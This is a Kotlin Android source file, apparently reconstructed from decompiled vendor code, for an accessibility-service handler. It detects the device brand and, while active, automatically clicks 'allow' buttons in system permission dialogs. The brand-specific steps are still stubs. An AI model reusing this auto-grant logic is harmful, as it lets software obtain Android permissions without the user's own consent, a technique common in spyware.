package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.base.AccessibilityDelegate
import com.storm.safe.rock.service.modules.base.ListenWindow
import java.util.LinkedHashSet

/**
 * Yw5xud Authorization Handler — orchestrator for all brand-specific permission flows.
 *
 * Matches vendor C0372a9 (a9). Key responsibilities:
 * - OS family detection via system properties
 * - Brand detection via Build.BRAND/MANUFACTURER
 * - Dispatch to brand-specific Steps classes
 * - BFS text collection from accessibility tree
 * - CheckBox/CompoundButton finding for toggle operations
 * - Permission allow button ID matching
 * - Background thread management
 */
open class Yw5xudHandler(
    service: MyAccessibilityService?,
    context: Context
) : AccessibilityDelegate("Yw5xudHandler", service, context) {

    // Test-friendly constructor
    constructor(context: Context) : this(null, context)

    companion object {
        private const val TAG = "Yw5xudAuthHandler"

        /** Permission allow button resource IDs (vendor f55154b1) */
        val PERMISSION_ALLOW_BUTTON_IDS = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "com.google.android.packageinstaller:id/permission_allow_button",
            "android:id/button1",
            "com.android.settings:id/action_button"
        )

        /** BFS constants matching vendor a6() */
        private const val MAX_TEXT_ITEMS = 50
        private const val MAX_BFS_ITERATIONS = 200
        private const val MAX_BFS_DEPTH = 10
        private const val MAX_CHILDREN_PER_NODE = 15

        /**
         * BFS collect visible text/contentDescription from accessibility tree.
         * Matches vendor m212438a6().
         * @return up to [MAX_TEXT_ITEMS] unique text strings
         */
        fun collectVisibleTexts(root: AccessibilityNodeInfo): Set<String> {
            val result = LinkedHashSet<String>()
            val queue = ArrayDeque<Pair<AccessibilityNodeInfo, Int>>()
            queue.addLast(root to 0)
            var iterations = 0

            while (queue.isNotEmpty() && result.size < MAX_TEXT_ITEMS && iterations < MAX_BFS_ITERATIONS) {
                val (node, depth) = queue.removeLast() // DFS-like (stack) per vendor
                iterations++
                try {
                    if (node.isVisibleToUser) {
                        node.text?.toString()?.trim()?.takeIf { s -> s.isNotEmpty() }?.let { s -> result.add(s) }
                        node.contentDescription?.toString()?.trim()?.takeIf { s -> s.isNotEmpty() }?.let { s -> result.add(s) }
                    }
                    if (depth < MAX_BFS_DEPTH) {
                        val childCount = minOf(node.childCount, MAX_CHILDREN_PER_NODE)
                        for (i in 0 until childCount) {
                            node.getChild(i)?.let { child -> queue.addLast(child to depth + 1) }
                        }
                    }
                } catch (_: Exception) {}
            }
            return result
        }

        /**
         * Find CheckBox/CompoundButton sibling or clickable parent.
         * Matches vendor m212440b5().
         */
        @Suppress("DEPRECATION")
        fun findCheckBoxOrClickableParent(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
            try {
                val className = node.className?.toString() ?: ""
                // If node itself is a CheckBox/CompoundButton, return it
                if (className.contains("CheckBox") || className.contains("CompoundButton")) {
                    return node
                }
                // Search siblings for CheckBox/CompoundButton
                val parent = node.parent ?: return null
                val childCount = parent.childCount
                for (i in 0 until childCount) {
                    val child = parent.getChild(i) ?: continue
                    val childClass = child.className?.toString() ?: ""
                    if (childClass.contains("CheckBox") || childClass.contains("CompoundButton")) {
                        parent.recycle()
                        return child
                    }
                    child.recycle()
                }
                // Fallback: if parent is clickable, return it
                if (parent.isClickable) {
                    return parent
                }
                parent.recycle()
            } catch (_: Exception) {}
            return null
        }
    }

    // Background thread for engine operations (vendor f55147a4)
    private val bgThread = HandlerThread("Yw5xudBg").also { t -> t.start() }
    val bgHandler = Handler(bgThread.looper)

    // Authorization state (vendor f55149a6)
    @Volatile
    var isAuthorizing: Boolean = false
        private set

    // Delay constants (vendor f55151a8, f55157b4)
    val stepDelay: Long = 300L

    // -- Brand dispatch --

    override suspend fun doExecute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        isAuthorizing = true
        try {
            Log.i(TAG, "\uD83D\uDE80 [Yw5xud] \u5F00\u59CB\u6388\u6743: ${android.os.Build.BRAND}")

            val isInternational = BrandDetector.isInternationalBrand()
            val isVivo = BrandDetector.isVivo()
            val isXiaomi = BrandDetector.isXiaomi()
            val isSamsung = BrandDetector.isSamsung()
            val isMeizu = BrandDetector.isMeizu()
            val isHuawei = BrandDetector.isHuawei()
            val isOppo = BrandDetector.isOppo()

            // International brand detection + autostart (vendor s60.m214564a2)
            if (isInternational) {
                logs.add("\u56FD\u9645\u54C1\u724C\u68C0\u6D4B")
                // GenericSteps will handle international brand autostart
            }

            // Brand-specific dispatch (matches vendor switch in a2/doExecute)
            when {
                isSamsung -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Samsung \u2192 SamsungSteps")
                    executeSamsungSteps(successes, failures, logs)
                }
                isHuawei -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Huawei/Honor \u2192 HuaweiSteps")
                    executeHuaweiSteps(successes, failures, logs)
                }
                isOppo -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: OPPO/Realme/OnePlus \u2192 OppoSteps")
                    executeOppoSteps(successes, failures, logs)
                }
                isVivo -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Vivo/iQOO \u2192 VivoSteps")
                    executeVivoSteps(successes, failures, logs)
                }
                isXiaomi -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Xiaomi/Redmi/POCO \u2192 MiuiSteps")
                    executeMiuiSteps(successes, failures, logs)
                }
                isMeizu -> {
                    logs.add("\u54C1\u724C\u8BC6\u522B: Meizu \u2192 MeizuSteps")
                    executeMeizuSteps(successes, failures, logs)
                }
                else -> {
                    // Fallback: detect by OS family
                    val osFamily = OsFamily.detect()
                    logs.add("\u54C1\u724C\u672A\u8BC6\u522B, OS\u68C0\u6D4B: ${osFamily.id}")
                    when (osFamily) {
                        OsFamily.EMUI -> executeHuaweiSteps(successes, failures, logs)
                        OsFamily.MIUI -> executeMiuiSteps(successes, failures, logs)
                        OsFamily.COLOROS -> executeOppoSteps(successes, failures, logs)
                        OsFamily.ORIGINOS -> executeVivoSteps(successes, failures, logs)
                        OsFamily.ONEUI -> executeSamsungSteps(successes, failures, logs)
                        OsFamily.FLYME -> executeMeizuSteps(successes, failures, logs)
                        OsFamily.UNKNOWN -> {
                            logs.add("\u672A\u77E5\u54C1\u724C/OS, \u4F7F\u7528\u901A\u7528\u6B65\u9AA4")
                        }
                    }
                }
            }

            // Always run generic steps (vendor a8)
            executeGenericSteps(successes, failures, logs)

        } finally {
            isAuthorizing = false
        }
    }

    // --- Brand step dispatch stubs (to be filled by brand Step classes) ---

    internal open suspend fun executeMiuiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("MiuiSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeHuaweiSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("HuaweiSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeOppoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("OppoSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeVivoSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("VivoSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeSamsungSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("SamsungSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeMeizuSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("MeizuSteps: \u672A\u5B9E\u73B0")
    }
    internal open suspend fun executeGenericSteps(s: MutableList<String>, f: MutableList<String>, l: MutableList<String>) {
        l.add("GenericSteps: \u672A\u5B9E\u73B0")
    }

    // --- Event handling ---

    override fun onAccessibilityEvent(event: AccessibilityEvent, packageName: String, className: String) {
        if (!isActive || !isAuthorizing) return
        // Permission auto-grant: check if current window shows a permission dialog
        try {
            val root = service?.rootInActiveWindow ?: return
            for (buttonId in PERMISSION_ALLOW_BUTTON_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(buttonId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser && node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        Log.i(TAG, "\u2705 \u81EA\u52A8\u70B9\u51FB\u6743\u9650\u5141\u8BB8\u6309\u94AE: $buttonId")
                        return
                    }
                }
            }
        } catch (_: Exception) {}
    }

    override fun getListenWindows(): List<ListenWindow> {
        // Listen to permission controller and settings
        return listOf(
            ListenWindow("com.android.permissioncontroller"),
            ListenWindow("com.google.android.permissioncontroller"),
            ListenWindow("com.android.packageinstaller"),
            ListenWindow("com.google.android.packageinstaller"),
            ListenWindow("com.android.settings")
        )
    }

    override fun dispose() {
        isAuthorizing = false
        bgThread.quitSafely()
        super.dispose()
    }
}
